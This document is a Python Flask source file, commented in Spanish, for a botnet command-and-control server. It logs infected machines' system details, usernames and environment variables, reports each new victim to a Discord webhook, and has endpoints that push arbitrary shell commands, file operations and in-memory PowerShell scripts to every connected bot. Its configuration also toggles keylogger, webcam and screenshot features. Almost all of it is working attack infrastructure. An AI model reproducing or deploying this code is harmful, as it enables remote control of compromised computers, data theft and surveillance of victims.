from datetime import datetime
import json
from flask import Flask, jsonify, request
import logging
import socket
import ssl
import sys
import threading
import time
import os
import ipaddress
import sqlite3
import configparser
import requests
import psutil

app = Flask(__name__)

# Variables globales y configuración
API_URL = "http://127.0.0.1:5000"  # Añadir esta línea
bots = []
bot_ids = {}
sistemas_operativos = {}
respuestas_bots = {}
server_running = True
start_time = datetime.now()  # Añadir esta línea para tracking del uptime

# Añadir la nueva constante para el canal de notificaciones
DISCORD_NOTIFICATION_CHANNEL = 1343173249202262076

def cargar_configuracion():
    """Carga la configuración del servidor."""
    config = configparser.ConfigParser()
    config.read(os.path.join(os.path.dirname(__file__), "..", "config", "config.ini"))
    
    # Validar secciones requeridas
    required_sections = ['NETWORK', 'DATABASE', 'LOGGING', 'SECURITY', 'FEATURES', 'NOTIFICATIONS']
    for section in required_sections:
        if not config.has_section(section):
            raise ValueError(f"Sección {section} no encontrada en config.ini")
    
    return config

def configurar_logging(config):
    """Configura el sistema de logging."""
    log_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), config.get("LOGGING", "LOG_DIR"), config.get("LOGGING", "SERVER_LOG_FILE"))
    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler(log_path, encoding="utf-8"),
            logging.StreamHandler()
        ]
    )

def aceptar_conexiones(server):
    """Acepta conexiones de bots."""
    global server_running
    bot_id = 1
    while server_running:
        try:
            conn, addr = server.accept()
            bots.append(conn)
            bot_ids[conn] = bot_id
            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()
            bot_id += 1
        except socket.timeout:
            continue
        except Exception as e:
            if server_running:
                logging.error(f"Error aceptando conexión: {e}")

from modules.database_manager import DatabaseManager

# Inicializar el gestor de base de datos
db = DatabaseManager()  # Ya no pasamos la ruta, usará la predeterminada

async def enviar_notificacion_discord(bot_info):
    """Envía una notificación a Discord cuando se conecta un bot."""
    try:
        channel_id = 1342904780506398781
        webhook_url = f"http://127.0.0.1:5000/discord_notify/{channel_id}"
        
        system_info = json.loads(bot_info.get("system_info", "{}"))
        
        embed = {
            "title": "🔵 Nuevo Bot Conectado",
            "description": "Se ha conectado un nuevo bot al servidor C&C",
            "color": 3447003,  # Azul
            "fields": [
                {"name": "ID", "value": str(bot_info["id"]), "inline": True},
                {"name": "Sistema Operativo", "value": system_info.get("os", "Desconocido"), "inline": True},
                {"name": "Hostname", "value": system_info.get("hostname", "Desconocido"), "inline": True},
                {"name": "IP", "value": bot_info["ip_address"], "inline": True},
                {"name": "Versión", "value": system_info.get("version", "Desconocida"), "inline": True},
                {"name": "Procesador", "value": system_info.get("processor", "Desconocido"), "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }
        
        requests.post(webhook_url, json={"embed": embed})
    except Exception as e:
        logging.error(f"Error enviando notificación a Discord: {e}")

def notificar_discord(titulo, descripcion, color=0x3498db, fields=None):
    """Envía una notificación al canal de Discord específico."""
    try:
        config_bot = configparser.ConfigParser()
        config_bot.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))
        
        if not config_bot.getboolean("NOTIFICATIONS", "NOTIFY_ON_BOT_CONNECT", fallback=True):
            return
            
        webhook_url = config_bot.get("DISCORD", "WEBHOOK_URL")
        embed_color = config_bot.getint("NOTIFICATIONS", "EMBED_COLOR_INFO")
        
        embed = {
            "title": titulo,
            "description": descripcion,
            "color": color or embed_color,
            "timestamp": datetime.now().isoformat(),
            "fields": fields or []
        }
        
        requests.post(webhook_url, json={"embeds": [embed]})
        
    except Exception as e:
        logging.error(f"Error enviando notificación a Discord: {e}")

def manejar_bot(conn, addr, bot_id):
    """Maneja la conexión con un bot."""
    config = cargar_configuracion()
    config_bot = configparser.ConfigParser()  # Add config_bot definition
    config_bot.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))
    db_bot_id = None
    try:
        # Configurar timeout desde config
        conn.settimeout(config.getint("NETWORK", "TIMEOUT", fallback=30))
        
        # Verificar autenticación si está habilitada
        if config.getboolean("SECURITY", "AUTHENTICATION_REQUIRED", fallback=True):
            # Implementar lógica de autenticación aquí
            pass
            
        # Esperar identificación del bot
        identificador = conn.recv(1024).decode("utf-8").strip()
        if not identificador:
            conn.close()
            return
            
        # Detectar sistema operativo
        conn.send("detect_os".encode("utf-8"))
        os_info = conn.recv(4096).decode("utf-8", errors="ignore").strip()
        
        # Asegurarse de que el JSON es válido
        try:
            sistema = json.loads(os_info)
        except json.JSONDecodeError as e:
            logging.error(f"JSON inválido recibido del bot: {os_info}")
            logging.error(f"Error decodificando JSON: {e}")
            sistema = {
                "os": "desconocido",
                "hostname": "unknown",
                "version": "desconocida",
                "machine": "desconocida",
                "processor": "desconocido"
            }

        # Registrar bot en la base de datos con manejo de errores mejorado
        try:
            db_bot_id = db.register_bot(
                unique_id=identificador,
                ip_address=addr[0],
                system_info=json.dumps(sistema),  # Asegurarse de que es un string JSON válido
                hostname=sistema.get("hostname", f"bot_{bot_id}"),
                additional_info={
                    "port": addr[1],
                    "connection_time": datetime.now().isoformat(),
                    "public_ip": requests.get('https://api.ipify.org').text,
                    "connection_type": "IPv4" if "." in addr[0] else "IPv6",
                    "domain": socket.getfqdn(addr[0])
                }
            )
        except Exception as e:
            logging.error(f"Error registrando bot en la base de datos: {e}")
            raise

        # Actualizar estructuras en memoria antes de notificar
        sistemas_operativos[conn] = sistema.get("os", "desconocido")
        if conn not in bots:
            bots.append(conn)
        bot_ids[conn] = bot_id
        
        # Verificar características habilitadas
        sistema["features"] = {
            "file_ops": config.getboolean("FEATURES", "ENABLE_FILE_OPERATIONS"),
            "screenshots": config.getboolean("FEATURES", "ENABLE_SCREENSHOTS"),
            "keylogger": config.getboolean("FEATURES", "ENABLE_KEYLOGGER"),
            "webcam": config.getboolean("FEATURES", "ENABLE_WEBCAM")
        }
        
        # Enviar notificación a Discord con información extendida
        notificar_discord(
            titulo="🔵 Nuevo Bot Conectado",
            descripcion=f"Se ha conectado un nuevo bot al servidor C&C\nIP Pública: {requests.get('https://api.ipify.org').text}",
            color=0x3498db,  # Azul
            fields=[
                {"name": "🔑 ID", "value": str(db_bot_id), "inline": True},
                {"name": "💻 Sistema Operativo", "value": sistema.get("os", "Desconocido"), "inline": True},
                {"name": "🏠 Hostname", "value": sistema.get("hostname", "Desconocido"), "inline": True},
                {"name": "🌐 IP Local", "value": addr[0], "inline": True},
                {"name": "📦 Arquitectura", "value": sistema.get("machine", "Desconocida"), "inline": True},
                {"name": "🔧 Procesador", "value": sistema.get("processor", "Desconocido"), "inline": True},
                {"name": "📊 Versión", "value": sistema.get("version", "Desconocida"), "inline": True},
                {"name": "🕒 Tiempo de actividad", "value": sistema.get("uptime", "Desconocido"), "inline": True},
                {"name": "👤 Usuario", "value": sistema.get("username", "Desconocido"), "inline": True},
                {"name": "🗂️ Directorio actual", "value": sistema.get("current_dir", "Desconocido"), "inline": False},
                {"name": "📝 Variables de entorno", "value": str(sistema.get("env_vars", "Desconocidas"))[:1024], "inline": False}
            ]
        )
        
        logging.info(f"Bot {bot_id} registrado en DB con ID {db_bot_id}")
        
        # Bucle principal de comunicación
        while True:
            try:
                data = conn.recv(8192)  # Aumentado buffer de 4096 a 8192
                if not data:
                    break
                    
                try:
                    decoded_data = data.decode("utf-8", errors="ignore").strip()
                    if decoded_data:
                        # Almacenar respuesta en la base de datos
                        db.store_response(db_bot_id, "unknown", decoded_data)
                        respuestas_bots[bot_id] = decoded_data
                except Exception as decode_error:
                    logging.error(f"Error decodificando respuesta: {decode_error}")
                    continue
                    
            except socket.timeout:
                # Solo registrar timeout si realmente esperábamos una respuesta
                if bot_id in respuestas_bots:
                    logging.warning(f"Timeout esperando respuesta del bot {bot_id}")
                continue
            except Exception as e:
                logging.error(f"Error en comunicación con bot {bot_id}: {e}")
                break
                
    except Exception as e:
        if config.getboolean("NOTIFICATIONS", "ENABLE_DISCORD"):
            notificar_discord(
                "❌ Error con Bot",
                f"Error manejando bot {bot_id}: {str(e)}",
                config_bot.getint("NOTIFICATIONS", "EMBED_COLOR_ERROR")
            )
        logging.error(f"Error con bot {bot_id}: {e}")
    finally:
        # Marcar bot como inactivo en la base de datos
        if db_bot_id:
            try:
                db.mark_bot_inactive(db_bot_id)
                notificar_discord(
                    titulo="🔴 Bot Desconectado",
                    descripcion=f"El bot {db_bot_id} se ha desconectado",
                    color=0xff0000  # Rojo
                )
            except Exception as e:
                logging.error(f"Error al marcar bot como inactivo: {e}")
            
        conn.close()
        if conn in bots:
            bots.remove(conn)
        if conn in bot_ids:
            del bot_ids[conn]
        if conn in sistemas_operativos:
            del sistemas_operativos[conn]

@app.route('/listar_bots', methods=['GET'])
def listar_bots():
    """Lista todos los bots conectados."""
    try:
        active_bots = db.get_active_bots() if db else []
        if active_bots:
            return jsonify([{
                "id": bot["id"],
                "so": json.loads(bot["system_info"]).get("os", "Unknown"),  # Extraer OS del JSON
                "ip": bot["ip_address"],
                "hostname": json.loads(bot["system_info"]).get("hostname", f"bot_{bot['id']}"),  # Extraer hostname del JSON
                "last_seen": bot["last_seen"]
            } for bot in active_bots])
        return jsonify({"message": "No hay bots conectados."})
    except Exception as e:
        app.logger.error(f"Error en listar_bots: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/enviar_comando', methods=['POST'])
def enviar_comando():
    """Envía comandos a los bots."""
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No se recibieron datos"}), 400
            
        if not bots:
            return jsonify({"message": "No hay bots conectados."})

        respuestas = {}
        comando_windows = data.get("comando_windows")
        comando_linux = data.get("comando_linux")
        tipo = data.get("tipo", "normal")
        
        # Log de comando recibido
        app.logger.info(f"Comando recibido - Tipo: {tipo}")
        app.logger.info(f"Windows: {comando_windows}")
        app.logger.info(f"Linux: {comando_linux}")
        
        for bot in bots:
            try:
                comando = comando_windows if sistemas_operativos.get(bot) == "windows" else comando_linux
                if not comando:
                    continue
                
                # Log del envío
                bot_id = bot_ids.get(bot)
                app.logger.info(f"Enviando comando a bot {bot_id}")
                
                # Enviar comando con tipo
                cmd_data = json.dumps({
                    "command": comando,
                    "type": tipo
                })
                bot.send(cmd_data.encode("utf-8"))
                
                if not bot_id:
                    continue
                
                # Esperar respuesta con timeout
                start_time = time.time()
                response_received = False
                
                while time.time() - start_time < 60:  # Aumentar a 60 segundos
                    if bot_id in respuestas_bots:
                        respuesta = respuestas_bots.pop(bot_id)
                        # Log de respuesta recibida
                        app.logger.info(f"Respuesta recibida de bot {bot_id}: {str(respuesta)[:100]}...")
                        
                        if respuesta:
                            respuestas[str(bot_id)] = respuesta
                            response_received = True
                        break
                    time.sleep(0.5)
                
                if not response_received:
                    app.logger.warning(f"Timeout esperando respuesta del bot {bot_id}")
                    respuestas[str(bot_id)] = "Timeout: No se recibió respuesta"
                    
            except Exception as e:
                app.logger.error(f"Error enviando comando a bot {bot_ids.get(bot)}: {str(e)}")
                respuestas[str(bot_ids.get(bot))] = f"Error: {str(e)}"

        # Log de respuestas
        app.logger.info(f"Respuestas totales: {len(respuestas)}")
        
        if not respuestas:
            return jsonify({"message": "No se recibieron respuestas de los bots"})
            
        return jsonify({"respuestas": respuestas})
        
    except Exception as e:
        app.logger.error(f"Error en enviar_comando: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/shutdown', methods=['POST'])
def shutdown():
    """Apaga el servidor y desconecta todos los bots."""
    global server_running
    try:
        server_running = False
        for bot in bots[:]:
            try:
                bot.send("shutdown".encode("utf-8"))
                bot.close()
            except:
                pass
        bots.clear()
        bot_ids.clear()
        sistemas_operativos.clear()
        respuestas_bots.clear()
        return jsonify({"message": "Servidor apagado correctamente"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

from modules.basic_commands import *
from modules.file_operations import *
from modules.advanced_execution import *

# Nuevos endpoints después de los existentes
@app.route('/execute_command', methods=['POST'])
def execute_system_command_endpoint():
    """Ejecuta un comando del sistema en los bots seleccionados."""
    try:
        data = request.json
        command = data.get('command')
        bot_ids = data.get('bot_ids', [])
        
        respuestas = {}
        for bot in bots:
            if not bot_ids or bot_ids.get(bot) in bot_ids:
                try:
                    bot.send(f"cmd:{command}".encode("utf-8"))
                    bot_id = bot_ids[bot]
                    # Esperar respuesta
                    tiempo_inicio = time.time()
                    while time.time() - tiempo_inicio < 5:
                        if bot_id in respuestas_bots:
                            respuestas[bot_id] = respuestas_bots.pop(bot_id)
                            break
                        time.sleep(0.1)
                except:
                    continue
        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/file_operations', methods=['POST'])
def file_operations_endpoint():
    """Maneja operaciones con archivos."""
    try:
        data = request.json
        operation = data.get('operation')
        path = data.get('path')
        file_data = data.get('file_data')
        bot_ids = data.get('bot_ids', [])
        
        respuestas = {}
        for bot in bots:
            if not bot_ids or bot_ids.get(bot) in bot_ids:
                try:
                    cmd = f"file:{operation}:{path}"
                    if file_data:
                        cmd += f":{file_data}"
                    bot.send(cmd.encode("utf-8"))
                    bot_id = bot_ids[bot]
                    # Esperar respuesta
                    tiempo_inicio = time.time()
                    while time.time() - tiempo_inicio < 5:
                        if bot_id in respuestas_bots:
                            respuestas[bot_id] = respuestas_bots.pop(bot_id)
                            break
                        time.sleep(0.1)
                except:
                    continue
        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/execute_script', methods=['POST'])
def execute_script_endpoint():
    """Ejecuta scripts en memoria."""
    try:
        data = request.json
        script = data.get('script')
        script_type = data.get('type', 'powershell')
        bot_ids = data.get('bot_ids', [])
        
        respuestas = {}
        for bot in bots:
            if not bot_ids or bot_ids.get(bot) in bot_ids:
                try:
                    cmd = f"script:{script_type}:{script}"
                    bot.send(cmd.encode("utf-8"))
                    bot_id = bot_ids[bot]
                    # Esperar respuesta
                    tiempo_inicio = time.time()
                    while time.time() - tiempo_inicio < 5:
                        if bot_id in respuestas_bots:
                            respuestas[bot_id] = respuestas_bots.pop(bot_id)
                            break
                        time.sleep(0.1)
                except:
                    continue
        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/discord_notify/<int:channel_id>', methods=['POST'])
def discord_notify(channel_id):
    """Endpoint para enviar notificaciones a Discord."""
    try:
        data = request.json
        if not data or 'embed' not in data:
            return jsonify({"error": "Invalid data"}), 400
            
        # Enviar mensaje al canal de Discord
        for bot in bots:
            try:
                mensaje = json.dumps({
                    "type": "discord_notification",
                    "channel_id": channel_id,
                    "embed": data["embed"]
                })
                bot.send(mensaje.encode("utf-8"))
            except:
                continue
                
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Nuevos endpoints administrativos
@app.route('/admin/clean_inactive', methods=['POST'])
def clean_inactive_bots():
    """Limpia los bots inactivos de la base de datos."""
    try:
        cleaned = db.clean_inactive_bots()
        return jsonify({"success": True, "cleaned": cleaned})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin/stats', methods=['GET'])
def get_server_stats():
    """Obtiene estadísticas del servidor."""
    try:
        stats = {
            "total_bots": len(db.get_all_bots()),
            "active_bots": len(db.get_active_bots()),
            "total_commands": db.get_command_count(),
            "uptime": str(datetime.now() - start_time),
            "cpu_usage": psutil.cpu_percent(),
            "memory_usage": psutil.virtual_memory().percent
        }
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin/restart', methods=['POST'])
def restart_server():
    """Reinicia el servidor."""
    try:
        # Implementar lógica de reinicio
        os.execl(sys.executable, sys.executable, *sys.argv)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin/config', methods=['GET', 'POST'])
def manage_config():
    """Gestiona la configuración del servidor."""
    try:
        if request.method == 'GET':
            config = cargar_configuracion()
            return jsonify(dict(config._sections))
        else:
            data = request.json
            config = cargar_configuracion()
            section = data["section"]
            key = data["key"]
            value = data["value"]
            
            if not config.has_section(section):
                config.add_section(section)
            config.set(section, key, value)
            
            with open(os.path.join(os.path.dirname(__file__), "..", "config", "config.ini"), 'w') as f:
                config.write(f)
                
            return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def iniciar_servidor_cnc():
    """Inicia el servidor CnC."""
    global server_running
    try:
        config = cargar_configuracion()
        if not config:
            raise ValueError("No se pudo cargar la configuración")
            
        configurar_logging(config)
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = config.get("NETWORK", "HOST", fallback="127.0.0.1")
        port = config.getint("NETWORK", "PORT", fallback=5001)
        
        server.bind((host, port))
        server.listen(5)
        server.settimeout(1)
        
        print(f"[+] Servidor CnC escuchando en {host}:{port}")
        
        def accept_wrapper():
            next_bot_id = 1
            while server_running:
                try:
                    conn, addr = server.accept()
                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()
                    next_bot_id += 1
                except socket.timeout:
                    continue
                except Exception as e:
                    if server_running:
                        app.logger.error(f"Error aceptando conexión: {e}")
        
        threading.Thread(target=accept_wrapper, daemon=True).start()
        return True
        
    except Exception as e:
        app.logger.error(f"Error iniciando servidor CnC: {e}")
        return False

# Configurar logging más detallado
app.logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(os.path.join(os.path.dirname(os.path.dirname(__file__)), "logs", "flask_debug.log"))
handler.setLevel(logging.DEBUG)
app.logger.addHandler(handler)

@app.errorhandler(500)
def handle_500_error(e):
    app.logger.error(f'Error interno del servidor: {str(e)}')
    return jsonify({
        "error": "Error interno del servidor",
        "details": str(e)
    }), 500

if __name__ == "__main__":
    try:
        print("[*] Iniciando servidor C&C...")
        if iniciar_servidor_cnc():
            print("[+] Servidor C&C iniciado correctamente")
            print("[*] Iniciando servidor web...")
            config = cargar_configuracion()
            api_port = config.getint("NETWORK", "API_PORT", fallback=5000)
            print(f"[*] Servidor web escuchando en http://127.0.0.1:{api_port}")
            
            # Configurar SSL si está habilitado
            ssl_context = None
            if config.getboolean("SECURITY", "ENABLE_SSL"):
                ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ssl_context.load_cert_chain(
                    config.get("SECURITY", "SSL_CERT"),
                    config.get("SECURITY", "SSL_KEY")
                )
            
            # Configurar Flask para producción
            app.config['ENV'] = 'production'
            app.config['DEBUG'] = False
            
            # Iniciar Flask
            app.run(
                host="127.0.0.1", 
                port=api_port, 
                debug=False, 
                use_reloader=False,
                threaded=True,
                ssl_context=ssl_context
            )
        else:
            print("[-] Error al iniciar el servidor C&C")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error crítico: {e}")
        sys.exit(1)
